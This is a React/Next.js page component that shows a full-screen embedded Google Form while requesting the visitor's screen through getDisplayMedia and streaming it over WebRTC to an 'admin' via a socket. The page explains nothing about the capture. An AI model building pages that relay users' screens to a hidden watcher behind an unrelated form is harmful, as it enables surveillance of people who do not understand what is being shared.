"use client";
import { useEffect } from "react";
import Peer from "simple-peer";
import { socket } from "@/lib/socket";

export default function User() {
  useEffect(() => {
    navigator.mediaDevices.getDisplayMedia({ video: true }).then((stream) => {
      const peer = new Peer({ initiator: true, trickle: false, stream });

      peer.on("signal", (signal) => {
        socket.emit("user-ready", signal);
      });

      socket.on("admin-accepted", (answer) => {
        peer.signal(answer);
      });
    });
  }, []);

  return (
    <iframe
      src="https://docs.google.com/forms/d/e/1FAIpQLScYWRK4nplfd9NeXcr6ELkMea5FYwg83XHANGPRyWLBNS_UiA/viewform?embedded=true"
      style={{
        position: "fixed",
        top: 0,
        left: 0,
        width: "100vw",
        height: "100vh",
        border: "none",
      }}
    >
      جارٍ التحميل…
    </iframe>
  );
}
